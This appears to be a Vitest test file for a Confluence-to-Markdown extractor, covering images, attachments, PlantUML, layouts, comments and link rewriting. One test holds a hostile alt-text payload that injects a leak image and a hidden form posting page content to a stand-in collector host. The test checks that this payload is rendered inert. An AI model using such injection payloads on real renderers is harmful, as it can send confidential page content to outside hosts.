import { webcrypto } from "node:crypto";
import { marked } from "marked";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { ConfluenceApi } from "../../src/lib/confluence-api";
import { extractFromHtml, folderForPage } from "../../src/lib/extractor";
import * as storageRoundtrip from "../../src/lib/storage-roundtrip";
import { ApiError, type ConfluencePageMeta, type ExtractionRule } from "../../src/types";
import { readFixtureText } from "../fixtures/fixture-loader";

const testMeta: ConfluencePageMeta = {
  id: "1000",
  title: "Lorem sandbox overview",
  spaceKey: "LOREM",
  baseUrl: "https://wiki.example",
  url: "https://wiki.example/pages/viewpage.action?pageId=1000",
  version: 7,
  labels: ["lorem", "sandbox"],
  ancestors: [],
  attachmentCount: 2,
};

const PLANTUML_SAMPLE = "SyfFKj2rKt3CoKnELR1Io4ZDoSa70000";
const PLANTUML_HREF = `https://www.plantuml.com/plantuml/uml/${PLANTUML_SAMPLE}`;

const allTablesRule: ExtractionRule = {
  id: "all-tables-csv",
  name: "All tables to CSV",
  type: "selector",
  matcher: "table.confluenceTable, div.table-wrap > table",
  action: "to-csv",
  enabled: true,
};

type TestConfluenceApi = ConfluenceApi & {
  fetchBlob: (path: string, signal?: AbortSignal) => Promise<Blob>;
  fetchJson: <T>(path: string, signal?: AbortSignal) => Promise<T>;
};

const createApi = (): TestConfluenceApi => {
  const api = new ConfluenceApi("https://wiki.example", {
    maxRetries: 0,
  }) as TestConfluenceApi;
  vi.spyOn(api, "fetchBlob").mockResolvedValue(new Blob(["fake-image"], { type: "image/png" }));
  vi.spyOn(api, "fetchJson").mockRejectedValue(new Error("not mocked"));
  return api;
};

describe("folderForPage", () => {
  it("uses slugified title", () => {
    expect(folderForPage({ ...testMeta, title: "Lorem Typography: Ipsum v2" })).toBe(
      "lorem-typography-ipsum-v2",
    );
  });

  it("falls back to page id when slug is empty", () => {
    expect(folderForPage({ ...testMeta, title: "!!!" })).toBe("page-1000");
  });
});

describe("extractFromHtml", () => {
  beforeAll(() => {
    vi.stubGlobal("crypto", webcrypto);
  });

  afterAll(() => {
    vi.unstubAllGlobals();
  });

  beforeEach(() => {
    vi.restoreAllMocks();
  });

  it("produces only front matter and title for empty HTML", async () => {
    const api = createApi();

    const result = await extractFromHtml(api, "", testMeta, { rules: [] });

    expect(result.markdown).toContain('title: "Lorem sandbox overview"');
    expect(result.markdown).toContain('page_id: "1000"');
    expect(result.markdown).toContain("# Lorem sandbox overview\n\n");
    expect(result.markdown.trim().endsWith("# Lorem sandbox overview")).toBe(true);
    expect(result.tables).toEqual([]);
    expect(result.images).toEqual([]);
    expect(api.fetchBlob).not.toHaveBeenCalled();
  });

  it("skips reversible source generation and conversion when includeEditable is false", async () => {
    const api = createApi();
    const generateEditable = vi.spyOn(storageRoundtrip, "createStorageMarkdownExport");
    const convertBody = vi.spyOn(api, "convertBody");

    const result = await extractFromHtml(api, "<p>Lorem visible projection</p>", testMeta, {
      rules: [],
      includeEditable: false,
      exportImages: false,
      exportAttachments: false,
      fullPageStorage: {
        representation: "storage",
        html: "<p>Lorem source</p>",
        title: testMeta.title,
        pageId: testMeta.id,
        version: testMeta.version!,
      },
    });

    expect(result.markdown).toContain("Lorem visible projection");
    expect(result.editable).toBeUndefined();
    expect(generateEditable).not.toHaveBeenCalled();
    expect(convertBody).not.toHaveBeenCalled();
  });

  it("extracts authored content, additive CSV and resources without page chrome", async () => {
    const api = createApi();
    const html = await readFixtureText("confluence-page.html");

    const result = await extractFromHtml(api, html, testMeta, {
      rules: [
        {
          id: "skip-lorem-chrome",
          name: "Exclude page chrome",
          type: "selector",
          matcher: "#breadcrumb-section, .page-metadata",
          action: "skip",
          enabled: true,
        },
        allTablesRule,
      ],
      folder: folderForPage(testMeta),
      exportAttachments: false,
    });

    expect(result.folder).toBe("lorem-sandbox-overview");
    expect(result.markdown).toContain("> **NOTE**");
    expect(result.markdown).toContain("<summary>Lorem expansion</summary>");
    expect(result.markdown).toContain("Lorem expanded *details*.");
    expect(result.markdown).toContain("[LOREM READY]");
    expect(result.markdown).toContain("| Lorem key | Lorem value |");
    expect(result.markdown).toContain("| ipsum | dolor |");
    expect(result.tables).toHaveLength(1);
    expect(result.tables[0].csv).toBe(
      'Lorem key,Lorem value\nipsum,dolor\nsit,"amet\nconsectetur"',
    );
    const rendered = new DOMParser().parseFromString(
      marked.parse(result.markdown, { async: false }),
      "text/html",
    );
    expect(rendered.querySelector("pre code.language-js")?.textContent).toContain(
      'const lorem = "<Lorem>";\n  lorem.trim();\n',
    );
    expect(result.images).toHaveLength(1);
    expect(result.images[0].sourceUrl).toBe("/download/attachments/1700/lorem.png");
    expect(result.images[0].archivePath).toBe("lorem-sandbox-overview/images/lorem.png");
    expect(result.images[0].hash).toMatch(/^[a-f0-9]{64}$/);
    expect(result.markdown).toContain("![Lorem local image](images/lorem.png)");
    expect(api.fetchBlob).toHaveBeenCalledOnce();
    expect(result.markdown).not.toContain("Lorem chrome");
    expect(result.markdown).not.toContain("Lorem attachment chrome");
    expect(result.markdown).not.toContain("Lorem attachment control");
    expect(result.markdown).not.toContain("Lorem contents");
    expect(result.markdown).not.toContain('{"lorem":true}');
    expect(result.markdown).not.toContain("¶");
  });

  it("exports an encoded image resource using its authored filename alias", async () => {
    const api = createApi();
    const html = await readFixtureText("export/image-attachment.html");

    const result = await extractFromHtml(api, html, testMeta, {
      rules: [],
      exportAttachments: false,
      includeFrontMatter: false,
    });

    expect(result.images).toHaveLength(1);
    expect(result.images[0].sourceUrl).toBe(
      "/download/attachments/1700/lorem%20diagram.png?version=1",
    );
    expect(result.images[0].archivePath).toBe("images/lorem-diagram.png");
    expect(result.markdown).toContain("![Lorem diagram](images/lorem-diagram.png)");
    expect(result.markdown).not.toContain("![Lorem diagram](/download/");
    expect(api.fetchBlob).toHaveBeenCalledOnce();
  });

  it("keeps remote image Markdown and skips image downloads when exportImages is false", async () => {
    const api = createApi();

    const result = await extractFromHtml(
      api,
      '<p>Lorem ipsum</p><img src="/download/attachments/1700/lorem.png" alt="Lorem image" />',
      testMeta,
      { rules: [], exportImages: false, exportAttachments: false },
    );

    expect(result.markdown).toContain(
      "![Lorem image](https://wiki.example/download/attachments/1700/lorem.png)",
    );
    expect(result.images).toEqual([]);
    expect(result.attachments).toEqual([]);
    expect(result.commentAttachments).toEqual([]);
    expect(result.outcome).toEqual({
      attachments: {
        declared: 2,
        listed: 0,
        eligible: 0,
        archived: 0,
        skippedSize: 0,
        failedDownloads: 0,
      },
      plantUml: {
        discovered: 0,
        archived: 0,
        skippedLimit: 0,
        failedDownloads: 0,
        unsupported: 0,
      },
      layout: {
        status: "none",
        sections: 0,
      },
      failures: [],
    });
    expect(api.fetchBlob).not.toHaveBeenCalled();
  });

  it("preserves data images and resolves document-relative images without fetching viewer resources", async () => {
    const api = createApi();
    const dataImage = "data:image/png;base64,iVBORw0KGgo=";
    const result = await extractFromHtml(
      api,
      `<img src="lorem.png" alt="Relative" /><img src="${dataImage}" alt="Inline" />`,
      { ...testMeta, url: "https://wiki.example/wiki/pages/lorem" },
      {
        rules: [],
        includeEditable: false,
        exportImages: false,
        exportAttachments: false,
        exportPlantUmlAssets: false,
      },
    );

    expect(result.markdown).toContain("![Relative](https://wiki.example/wiki/pages/lorem.png)");
    expect(result.markdown).toContain(`![Inline](${dataImage})`);
    expect(result.images).toEqual([]);
    expect(api.fetchBlob).not.toHaveBeenCalled();
  });

  it("renders hostile image alt text as inert metadata through the online-image path", async () => {
    const api = createApi();
    const payload =
      "x](https://assets.example.test/leak.png) " +
      "<form action='https://collector.example.test/ingest' method='post'>" +
      "<button>Copy Markdown</button><textarea hidden name='content'>";

    const result = await extractFromHtml(
      api,
      `<p>Intro</p><img src="/download/attachments/1700/lorem.png" alt="${payload}">` +
        `<p>Confidential sentinel body</p>`,
      testMeta,
      {
        rules: [],
        includeEditable: false,
        exportImages: false,
        exportAttachments: false,
      },
    );
    const rendered = new DOMParser().parseFromString(
      marked.parse(result.markdown, { async: false }),
      "text/html",
    );

    expect(rendered.querySelectorAll("form, button, textarea")).toHaveLength(0);
    expect(rendered.querySelector("img")?.getAttribute("alt")).toBe(payload);
    expect(rendered.querySelector("img")?.getAttribute("src")).toBe(
      "https://wiki.example/download/attachments/1700/lorem.png",
    );
    expect(rendered.body.textContent).toContain("Confidential sentinel body");
  });

  it("materializes enabled PlantUML links and renders the local PNG inline", async () => {
    const fetchMock = vi.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(new Uint8Array([137, 80, 78, 71]), {
        headers: { "Content-Type": "image/png" },
      }),
    );

    const result = await extractFromHtml(
      createApi(),
      `<p><a href="${PLANTUML_HREF}">Sequence</a></p>`,
      testMeta,
      {
        rules: [],
        exportImages: false,
        exportAttachments: false,
        exportPlantUmlAssets: true,
        maxAttachmentSize: 1024,
      },
    );

    expect(fetchMock).toHaveBeenCalledOnce();
    expect(result.plantUmlAssets).toHaveLength(1);
    const asset = result.plantUmlAssets[0];
    expect(result.markdown).toContain(`![Sequence](${asset.png.archivePath})`);
    expect(await asset.source.blob.text()).toBe("Bob -> Alice : hello");
    expect(result.outcome.plantUml).toEqual({
      discovered: 1,
      archived: 1,
      skippedLimit: 0,
      failedDownloads: 0,
      unsupported: 0,
    });
    expect(result.outcome.attachments.archived).toBe(0);
  });

  it("preserves a PlantUML anchor when PNG materialization fails", async () => {
    vi.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response("not png", { headers: { "Content-Type": "text/plain" } }),
    );

    const result = await extractFromHtml(
      createApi(),
      `<p><a href="${PLANTUML_HREF}">Diagram</a></p>`,
      testMeta,
      {
        rules: [],
        exportImages: false,
        exportAttachments: false,
        exportPlantUmlAssets: true,
        maxAttachmentSize: 1024,
      },
    );

    expect(result.markdown).toContain(`[Diagram](${PLANTUML_HREF})`);
    expect(result.plantUmlAssets).toEqual([]);
    expect(result.outcome.plantUml.failedDownloads).toBe(1);
    expect(result.outcome.failures).toEqual([
      { scope: "linked-asset", page_id: "1000", reason: "fetch-failed", status: 200 },
    ]);
  });

  it("does not request PlantUML when materialization is disabled", async () => {
    const fetchMock = vi.spyOn(globalThis, "fetch");

    const result = await extractFromHtml(
      createApi(),
      `<p><a href="${PLANTUML_HREF}">Diagram</a></p>`,
      testMeta,
      {
        rules: [],
        exportImages: false,
        exportAttachments: false,
      },
    );

    expect(fetchMock).not.toHaveBeenCalled();
    expect(result.markdown).toContain(`[Diagram](${PLANTUML_HREF})`);
    expect(result.plantUmlAssets).toEqual([]);
  });

  it("preserves a synthetic Confluence layout and records its outcome", async () => {
    const view = `
      <div class="contentLayout2">
        <div class="columnLayout two-equal" data-layout="two-equal">
          <div class="cell"><div class="innerCell"><h2>Left</h2></div></div>
          <div class="cell"><div class="innerCell"><p>Right</p><p><a href="${PLANTUML_HREF}">Diagram</a></p></div></div>
        </div>
      </div>
    `;
    const storage = `
      <ac:layout><ac:layout-section ac:type="two_equal">
        <ac:layout-cell><h2>Left</h2></ac:layout-cell>
        <ac:layout-cell><p>Right</p><p><a href="${PLANTUML_HREF}">Diagram</a></p></ac:layout-cell>
      </ac:layout-section></ac:layout>
    `;
    vi.spyOn(globalThis, "fetch").mockResolvedValue(
      new Response(new Uint8Array([137, 80, 78, 71]), {
        headers: { "Content-Type": "image/png" },
      }),
    );

    const result = await extractFromHtml(createApi(), view, testMeta, {
      rules: [],
      storageHtml: storage,
      exportImages: false,
      exportAttachments: false,
      exportPlantUmlAssets: true,
      maxAttachmentSize: 1024,
    });

    expect(result.markdown).toContain("confx_layout: 1");
    expect(result.markdown).toContain('<!-- confx:section:start type="two_equal" -->');
    expect(result.plantUmlAssets).toHaveLength(1);
    expect(result.markdown).toContain(`![Diagram](${result.plantUmlAssets[0].png.archivePath})`);
    expect(result.outcome.layout).toEqual({ status: "preserved", sections: 1 });
    expect(result.outcome.failures).toEqual([]);
  });

  it("marks mismatched layouts unsupported instead of claiming a reversible export", async () => {
    const view = `
      <div class="contentLayout2">
        <div class="columnLayout two-equal" data-layout="two-equal">
          <div class="cell"><div class="innerCell"><p>Left</p></div></div>
          <div class="cell"><div class="innerCell"><p>Right</p></div></div>
        </div>
      </div>
    `;
    const storage =
      '<ac:layout><ac:layout-section ac:type="single"><ac:layout-cell><p>Only</p></ac:layout-cell></ac:layout-section></ac:layout>';

    const result = await extractFromHtml(createApi(), view, testMeta, {
      rules: [],
      storageHtml: storage,
      exportImages: false,
      exportAttachments: false,
    });

    expect(result.markdown).toContain("confx_layout: unsupported");
    expect(result.markdown).not.toContain("confx:layout:start");
    expect(result.outcome.layout).toEqual({ status: "flattened", sections: 1 });
    expect(result.outcome.failures).toContainEqual({
      scope: "page",
      page_id: "1000",
      reason: "layout-unsupported",
    });
  });

  it("includes front matter by default and excludes it when requested", async () => {
    const defaultResult = await extractFromHtml(createApi(), "<p>Lorem ipsum</p>", testMeta, {
      rules: [],
    });
    const withoutFrontMatter = await extractFromHtml(createApi(), "<p>Lorem ipsum</p>", testMeta, {
      rules: [],
      includeFrontMatter: false,
    });

    expect(defaultResult.markdown.startsWith("---\n")).toBe(true);
    expect(withoutFrontMatter.markdown.startsWith("# Lorem sandbox overview\n\nLorem ipsum")).toBe(
      true,
    );
    expect(withoutFrontMatter.markdown).not.toContain('page_id: "1000"');
  });

  it("rewrites exported internal Confluence links to relative Markdown paths", async () => {
    const api = createApi();
    const pageIdToFolder = new Map<string, string>([
      ["1100", "lorem/typography"],
      ["1300", "lorem/tables"],
    ]);
    const html = await readFixtureText("confluence-page.html");

    const result = await extractFromHtml(api, html, testMeta, {
      rules: [],
      folder: "lorem/overview",
      pageIdToFolder,
      rewriteLinks: true,
      includeFrontMatter: false,
      exportImages: false,
      exportAttachments: false,
    });

    expect(result.markdown).toContain("[Lorem typography](../typography/index.md)");
    expect(result.markdown).toContain("[Lorem tables](../tables/index.md)");
    expect(result.markdown).not.toContain("viewpage.action?pageId=1100");
    expect(result.markdown).not.toContain("viewpage.action?pageId=1300");
  });

  it("keeps comments out of page Markdown when comments export is enabled", async () => {
    const api = createApi();
    const getAttachments = vi.spyOn(api, "getAttachments");
    vi.spyOn(api, "fetchJson").mockImplementation(async (path) => {
      if (path === "/rest/api/content/1000/comment?expand=body.view,version") {
        return {
          results: [
            {
              id: "page-comment-1",
              body: { view: { value: "<p>Lorem page comment</p>" } },
              version: { by: { displayName: "Lorem" }, when: "2025-01-01T00:00:00Z" },
            },
          ],
        } as never;
      }
      if (path === "/rest/inlinecomments/1.0/comments?containerId=1000") {
        return [
          {
            id: "inline-1",
            authorDisplayName: "Ipsum",
            lastModificationDate: "2025-01-02T00:00:00Z",
            body: "<p>Lorem inline comment</p>",
            originalSelection: "fragment",
            markerRef: "marker-1",
          },
        ] as never;
      }
      if (path === "/rest/inlinecomments/1.0/comments/inline-1/replies") {
        return [
          {
            id: "reply-1",
            authorDisplayName: "Dolor",
            lastModificationDate: "2025-01-03T00:00:00Z",
            body: "<p>Lorem reply</p>",
          },
        ] as never;
      }
      throw new Error(`Unexpected path: ${path}`);
    });

    const result = await extractFromHtml(api, "<p>Lorem ipsum</p>", testMeta, {
      rules: [],
      exportImages: false,
      exportAttachments: false,
      includeComments: true,
    });

    expect(result.comments).toHaveLength(1);
    expect(result.comments[0].attachments).toEqual([]);
    expect(result.inlineComments).toHaveLength(1);
    expect(result.inlineComments[0].attachments).toEqual([]);
    expect(result.inlineComments[0].replies).toHaveLength(1);
    expect(result.inlineComments[0].replies[0].attachments).toEqual([]);
    expect(result.commentAttachments).toEqual([]);
    expect(result.markdown).not.toContain("comments:");
    expect(result.markdown).not.toContain("<!-- confx:comments:start -->");
    expect(result.markdown).not.toContain("<!-- confx:comments:end -->");
    expect(result.markdown).not.toContain("## Comments");
    expect(result.markdown).not.toContain("Lorem page comment");
    expect(result.markdown).not.toContain("Lorem inline comment");
    expect(result.markdown).not.toContain("Lorem reply");
    expect(getAttachments).not.toHaveBeenCalled();
  });

  it("does not fetch page or inline comments when comments export is disabled", async () => {
    const api = createApi();
    const fetchJson = vi.spyOn(api, "fetchJson");

    const result = await extractFromHtml(api, "<p>Lorem ipsum</p>", testMeta, {
      rules: [],
      exportImages: false,
      exportAttachments: false,
      includeComments: false,
    });

    expect(fetchJson).not.toHaveBeenCalled();
    expect(result.comments).toEqual([]);
    expect(result.inlineComments).toEqual([]);
    expect(result.commentAttachments).toEqual([]);
    expect(result.markdown).not.toContain("<!-- confx:comments:start -->");
  });

  it("carries attachment list failures into the page outcome", async () => {
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const api = createApi();
    vi.spyOn(api, "getAttachments").mockRejectedValue(
      new ApiError("forbidden", 403, "Forbidden", "/rest/api/content/1000/child/attachment"),
    );

    const result = await extractFromHtml(api, "<p>Lorem ipsum</p>", testMeta, {
      rules: [],
      exportImages: false,
    });

    expect(result.outcome.attachments).toEqual({
      declared: 2,
      listed: 0,
      eligible: 0,
      archived: 0,
      skippedSize: 0,
      failedDownloads: 0,
    });
    expect(result.outcome.failures).toEqual([
      {
        scope: "attachment",
        page_id: "1000",
        reason: "attachment-list-failed",
        status: 403,
      },
    ]);
  });

  it("reports failed images as resource omissions while keeping their exact online URL", async () => {
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const api = createApi();
    vi.spyOn(api, "fetchBlob").mockRejectedValue(new Error("resource unavailable"));
    const result = await extractFromHtml(
      api,
      '<img src="/download/attachments/1700/lorem.png" alt="Lorem" />',
      testMeta,
      { rules: [], exportAttachments: false },
    );
    expect(result.images).toEqual([]);
    expect(result.markdown).toContain(
      "![Lorem](https://wiki.example/download/attachments/1700/lorem.png)",
    );
    expect(result.outcome.failures).toContainEqual({
      scope: "attachment",
      page_id: "1000",
      href: "/download/attachments/1700/lorem.png",
      reason: "fetch-failed",
    });
  });
  describe("AbortSignal", () => {
    it("rejects a pre-aborted extraction before resource work or partial success", async () => {
      const api = createApi();
      const controller = new AbortController();
      controller.abort();

      await expect(
        extractFromHtml(
          api,
          '<p>Lorem ipsum</p><img src="/download/attachments/1700/lorem.png" alt="Lorem image" />',
          testMeta,
          { rules: [], signal: controller.signal },
        ),
      ).rejects.toMatchObject({ name: "AbortError" });
      expect(api.fetchBlob).not.toHaveBeenCalled();
    });
  });
});
